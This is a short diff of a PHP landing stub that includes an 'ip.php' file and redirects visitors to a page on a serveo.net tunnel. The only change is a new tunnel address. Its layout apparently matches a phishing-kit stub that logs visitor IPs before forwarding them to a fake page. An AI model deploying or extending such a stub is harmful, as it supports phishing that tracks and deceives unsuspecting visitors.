@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://94354b8a3e0548d9875eaac86ceb0267.serveo.net/index2.html');
+header('Location: https://40043b9ecb6360b658720b819c1a8d8d.serveo.net/index2.html');
 exit
 ?>
